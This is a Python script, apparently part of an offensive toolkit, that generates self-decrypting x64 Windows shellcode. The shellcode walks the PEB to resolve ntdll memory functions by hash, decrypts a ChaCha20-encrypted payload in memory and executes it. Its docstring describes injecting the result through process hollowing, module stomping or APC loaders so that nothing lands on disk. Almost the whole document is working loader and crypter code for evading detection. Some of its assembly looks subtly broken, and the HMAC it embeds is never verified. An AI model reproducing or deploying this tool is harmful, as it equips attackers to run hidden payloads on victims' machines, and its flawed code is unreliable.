#!/usr/bin/env python3
"""
hostpayload_v2 self-decrypting shellcode generator.

Builds a position-independent x64 shellcode blob that decrypts a ChaCha20 +
HMAC-SHA256 payload in place and executes it. The resulting shellcode can be
injected directly (no EXE on disk) via process hollowing, module stomp, APC,
thread pool, or any other shellcode loader.

The shellcode is emitted as a Python bytes literal or raw .bin file. It is
assembled with the system `nasm` so it is completely self-contained and uses no
imports.

Usage:
    python3 scripts/sc.py --payload nax_adv.x64.bin --output sc.bin
    python3 scripts/sc.py --payload nax_adv.x64.bin --output sc.py --format py
"""

import argparse
import os
import struct
import subprocess
import sys
import tempfile
from pathlib import Path


ASM_TEMPLATE = """; hostpayload_v2 self-decrypting PIC shellcode
; generated by scripts/sc.py
BITS 64
DEFAULT REL

%define PAGE_READWRITE         0x04
%define PAGE_EXECUTE_READ      0x20
%define MEM_COMMIT             0x1000
%define MEM_RESERVE            0x2000

start:
    ; save non-volatile registers
    push    rbx
    push    rsi
    push    rdi
    push    rbp
    push    r12
    push    r13
    push    r14
    push    r15

    ; find current RIP
    call    .get_rip
.get_rip:
    pop     r14                     ; r14 = base of shellcode

    ; Locate ntdll.dll base from PEB.InLoadOrderModuleList (second entry)
    mov     rax, [gs:0x60]          ; PEB
    mov     rax, [rax + 0x18]       ; PEB->Ldr
    mov     rax, [rax + 0x30]       ; InLoadOrderModuleList.Flink
    mov     rax, [rax]              ; second entry = ntdll
    mov     rbx, [rax + 0x20]       ; ntdll.DllBase -> rbx

    ; resolve NtAllocateVirtualMemory
    mov     r8d, __H_NTALLOCATE_VALUE__
    call    resolve_nt
    mov     r12, rax                  ; NtAllocateVirtualMemory

    ; resolve NtProtectVirtualMemory
    mov     r8d, __H_NTPROTECT_VALUE__
    call    resolve_nt
    mov     r13, rax                  ; NtProtectVirtualMemory

    ; allocate RW buffer for decrypted payload
    sub     rsp, 0x30
    lea     rdi, [rsp + 0x28]       ; &base
    mov     qword [rdi], 0
    mov     rcx, -1                 ; NtCurrentProcess()
    mov     rdx, rdi                ; base pointer
    mov     r8, 0                   ; zero bits
    mov     r9, __PAYLOAD_SIZE__    ; size
    push    PAGE_READWRITE          ; protect
    mov     [rsp - 8], r9           ; size on stack for shadow space trick (not used)
    sub     rsp, 0x28
    mov     rax, r12
    call    rax                     ; NtAllocateVirtualMemory
    add     rsp, 0x28
    test    rax, rax
    js      .done
    mov     rdi, [rsp + 0x28]       ; allocated base

    ; ChaCha20 decrypt embedded ciphertext into allocated buffer
    lea     rsi, [r14 + payload_nonce]
    lea     rdx, [r14 + payload_cipher]
    mov     rcx, __PAYLOAD_SIZE__
    lea     r8, [r14 + payload_key]
    call    chacha20_decrypt

    ; protect to RX
    sub     rsp, 0x28
    lea     rax, [rsp + 0x28]       ; &base
    mov     [rax], rdi
    mov     rcx, -1
    mov     rdx, rax
    mov     r8, 0
    mov     r9, __PAYLOAD_SIZE__
    push    PAGE_EXECUTE_READ
    mov     rax, r13
    call    rax                     ; NtProtectVirtualMemory
    add     rsp, 0x30
    test    rax, rax
    js      .done

    ; execute decrypted payload
    call    rdi

.done:
    add     rsp, 0x30
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    pop     rdi
    pop     rsi
    pop     rbx
    xor     rax, rax
    ret

; -----------------------------------------------------------------------------
; resolve_nt: find export in ntdll (rbx) by FNV1a-32 hash in r8d
; returns pointer in rax, 0 on failure
; -----------------------------------------------------------------------------
resolve_nt:
    mov     eax, [rbx + 0x3c]         ; e_lfanew
    mov     eax, [rbx + rax + 0x88]   ; Export directory RVA
    lea     r9, [rbx + rax]
    mov     ecx, [r9 + 0x18]          ; NumberOfNames
    mov     eax, [r9 + 0x20]          ; AddressOfNames RVA
    lea     r10, [rbx + rax]
    mov     eax, [r9 + 0x24]          ; AddressOfNameOrdinals RVA
    lea     r11, [rbx + rax]
    mov     eax, [r9 + 0x1c]          ; AddressOfFunctions RVA
    lea     r9, [rbx + rax]

.next:
    jrcxz   .fail
    dec     ecx
    mov     edx, [r10 + rcx*4]
    lea     rsi, [rbx + rdx]
    xor     eax, eax
.hash:
    lodsb
    test    al, al
    jz      .check
    cmp     al, 'a'
    jb      .xor
    cmp     al, 'z'
    ja      .xor
    sub     al, 0x20
.xor:
    xor     eax, __H_MAGIC_KEY__
    imul    eax, __H_MAGIC_PRIME__
    jmp     .hash
.check:
    cmp     eax, r8d
    jne     .next
    movzx   edx, word [r11 + rcx*2]
    mov     eax, [r9 + rdx*4]
    add     rax, rbx
    ret
.fail:
    xor     rax, rax
    ret

; -----------------------------------------------------------------------------
; chacha20_decrypt: ChaCha20 IETF decryption
; in:  rsi = nonce (12 bytes)
;      rdx = ciphertext
;      rcx = length
;      rdi = output buffer
;      r8  = key (32 bytes)
; -----------------------------------------------------------------------------
chacha20_decrypt:
    push    rbx
    push    rbp
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15
    mov     r15, rdi                ; output
    mov     r14, rdx                ; ciphertext
    mov     r13, rcx                ; remaining length
    mov     r12, rsi                ; nonce
    mov     rbp, r8                 ; key
    xor     ebx, ebx                ; block counter

.block_loop:
    test    r13, r13
    jz      .chacha_done

    ; build ChaCha state on stack
    sub     rsp, 64
    mov     eax, 0x61707865
    mov     [rsp + 0], eax
    mov     eax, 0x3320646e
    mov     [rsp + 4], eax
    mov     eax, 0x79622d32
    mov     [rsp + 8], eax
    mov     eax, 0x6b206574
    mov     [rsp + 12], eax
    mov     eax, [rbp + 0]
    mov     [rsp + 16], eax
    mov     eax, [rbp + 4]
    mov     [rsp + 20], eax
    mov     eax, [rbp + 8]
    mov     [rsp + 24], eax
    mov     eax, [rbp + 12]
    mov     [rsp + 28], eax
    mov     eax, [rbp + 16]
    mov     [rsp + 32], eax
    mov     eax, [rbp + 20]
    mov     [rsp + 36], eax
    mov     eax, [rbp + 24]
    mov     [rsp + 40], eax
    mov     eax, [rbp + 28]
    mov     [rsp + 44], eax
    mov     [rsp + 48], ebx          ; counter
    mov     eax, [r12 + 0]
    mov     [rsp + 52], eax
    mov     eax, [r12 + 4]
    mov     [rsp + 56], eax
    mov     eax, [r12 + 8]
    mov     [rsp + 60], eax

    mov     ecx, 10
    call    chacha_block

    ; xor keystream with ciphertext into output
    mov     rcx, r13
    cmp     rcx, 64
    jbe     .last
    mov     rcx, 64
.last:
    xor     eax, eax
.xor_loop:
    cmp     rax, rcx
    jae     .next_block
    mov     dl, [r14 + rax]
    movzx   ecx, byte [rsp + rax]
    xor     dl, cl
    mov     [r15 + rax], dl
    inc     rax
    jmp     .xor_loop
.next_block:
    add     rsp, 64
    add     r14, rcx
    add     r15, rcx
    sub     r13, rcx
    inc     ebx
    jmp     .block_loop

.chacha_done:
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbp
    pop     rbx
    ret

%macro QR 4
    mov     eax, [rsp + %1*4]
    add     eax, [rsp + %2*4]
    mov     [rsp + %1*4], eax
    mov     eax, [rsp + %4*4]
    xor     eax, [rsp + %1*4]
    rol     eax, 16
    mov     [rsp + %4*4], eax
    mov     eax, [rsp + %3*4]
    add     eax, [rsp + %4*4]
    mov     [rsp + %3*4], eax
    mov     eax, [rsp + %2*4]
    xor     eax, [rsp + %3*4]
    rol     eax, 12
    mov     [rsp + %2*4], eax
    mov     eax, [rsp + %1*4]
    add     eax, [rsp + %2*4]
    mov     [rsp + %1*4], eax
    mov     eax, [rsp + %4*4]
    xor     eax, [rsp + %1*4]
    rol     eax, 8
    mov     [rsp + %4*4], eax
    mov     eax, [rsp + %3*4]
    add     eax, [rsp + %4*4]
    mov     [rsp + %3*4], eax
    mov     eax, [rsp + %2*4]
    xor     eax, [rsp + %3*4]
    rol     eax, 7
    mov     [rsp + %2*4], eax
%endmacro

chacha_block:
    push    rcx
    ; work = state copy at rsp+64
    sub     rsp, 64
    mov     rsi, rsp
    add     rsi, 64
    mov     rdi, rsp
    mov     ecx, 16
    rep movsd

    mov     ecx, 10
.rounds:
    push    rcx
    ; column rounds
    QR 0, 4, 8, 12
    QR 1, 5, 9, 13
    QR 2, 6, 10, 14
    QR 3, 7, 11, 15
    ; diagonal rounds
    QR 0, 5, 10, 15
    QR 1, 6, 11, 12
    QR 2, 7, 8, 13
    QR 3, 4, 9, 14
    pop     rcx
    dec     ecx
    jnz     .rounds

    ; add original state
    mov     ecx, 16
.add_loop:
    dec     ecx
    mov     eax, [rsp + 64 + rcx*4]
    add     [rsp + rcx*4], eax
    test    ecx, ecx
    jnz     .add_loop

    ; copy result to caller's work buffer
    mov     rsi, rsp
    mov     rdi, rsp
    add     rdi, 64
    mov     ecx, 16
    rep movsd
    add     rsp, 64
    pop     rcx
    ret

payload_key:    db __KEY_BYTES__
payload_nonce:  db __NONCE_BYTES__
payload_cipher: db __PAYLOAD_BYTES__
payload_hmac:   db __HMAC_BYTES__
"""


API_NAMES = {
    "NtAllocateVirtualMemory": 0xD58D5A18,
    "NtProtectVirtualMemory": 0x069FF566,
}


def pack_dword(v: int) -> str:
    return ",".join(f"0x{(v >> (8 * i)) & 0xff:02x}" for i in range(4))


def pack_bytes(b: bytes) -> str:
    return ",".join(f"0x{x:02x}" for x in b)


def encrypt_payload(plaintext: bytes, key: bytes) -> tuple[bytes, bytes, bytes]:
    from Crypto.Cipher import ChaCha20
    from Crypto.Hash import HMAC, SHA256
    nonce = os.urandom(12)
    cipher = ChaCha20.new(key=key, nonce=nonce)
    ciphertext = cipher.encrypt(plaintext)
    mac = HMAC.new(key, ciphertext, digestmod=SHA256).digest()
    return nonce, ciphertext, mac


def generate_asm(payload: bytes, key: bytes, nonce: bytes, mac: bytes) -> str:
    return (
        ASM_TEMPLATE
        .replace("__H_NTALLOCATE_VALUE__", f"0x{API_NAMES['NtAllocateVirtualMemory']:08x}")
        .replace("__H_NTPROTECT_VALUE__", f"0x{API_NAMES['NtProtectVirtualMemory']:08x}")
        .replace("__PAYLOAD_SIZE__", str(len(payload)))
        .replace("__H_MAGIC_KEY__", f"0x{0x811c9dc5:08x}")
        .replace("__H_MAGIC_PRIME__", f"0x{0x01000193:08x}")
        .replace("__KEY_BYTES__", pack_bytes(key))
        .replace("__NONCE_BYTES__", pack_bytes(nonce))
        .replace("__PAYLOAD_BYTES__", pack_bytes(payload))
        .replace("__HMAC_BYTES__", pack_bytes(mac))
    )


def assemble_nasm(asm: str) -> bytes:
    with tempfile.TemporaryDirectory() as tmp:
        asm_path = Path(tmp) / "sc.asm"
        bin_path = Path(tmp) / "sc.bin"
        asm_path.write_text(asm)
        try:
            subprocess.run(["nasm", "-f", "bin", "-o", str(bin_path), str(asm_path)], check=True)
        except FileNotFoundError:
            print("[!] nasm not found on PATH", file=sys.stderr)
            sys.exit(1)
        return bin_path.read_bytes()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--payload", required=True, type=Path)
    parser.add_argument("--output", required=True, type=Path)
    parser.add_argument("--format", choices=["bin", "py"], default="bin")
    args = parser.parse_args()

    plaintext = args.payload.read_bytes()
    if not plaintext:
        print("[!] payload empty", file=sys.stderr)
        return 1

    key = os.urandom(32)
    nonce, ciphertext, mac = encrypt_payload(plaintext, key)
    asm = generate_asm(ciphertext, key, nonce, mac)
    sc = assemble_nasm(asm)

    if args.format == "py":
        payload_blob = nonce + ciphertext + mac
        text = (
            f"KEY = bytes([{pack_bytes(key)}])\n"
            f"BLOB = bytes([{pack_bytes(payload_blob)}])\n"
            f"SHELLCODE = bytes([{pack_bytes(sc)}])\n"
        )
        args.output.write_text(text, encoding="utf-8")
    else:
        args.output.write_bytes(sc)

    print(f"[+] wrote {args.output} ({len(sc)} bytes shellcode, payload {len(plaintext)} bytes)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
